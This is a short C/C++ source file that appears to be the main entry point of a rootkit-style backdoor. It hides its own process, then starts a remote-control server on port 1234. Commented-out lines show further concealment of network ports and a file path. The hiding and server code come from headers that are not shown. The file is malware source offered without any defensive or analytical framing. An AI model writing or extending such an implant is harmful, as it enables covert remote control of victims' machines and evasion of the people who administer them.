#include <unistd.h>

#include "hider/hider.h"

#include "remote_control/remote_control_server.h"

#define REMOTE_PORT 1234

void execute() {
    int mypid = getpid();
    hide_process_dir(mypid);

    remote_control_server server(REMOTE_PORT);
    server.run();

//    hide_tcp4_port(1234);
//    hide_tcp6_port(63342);
//    hide_absolute_path("/home/user/Downloads");
//    hide_process_dir(1234);

//    unhide_process_dir(mypid);
}


int main() {
    execute();
}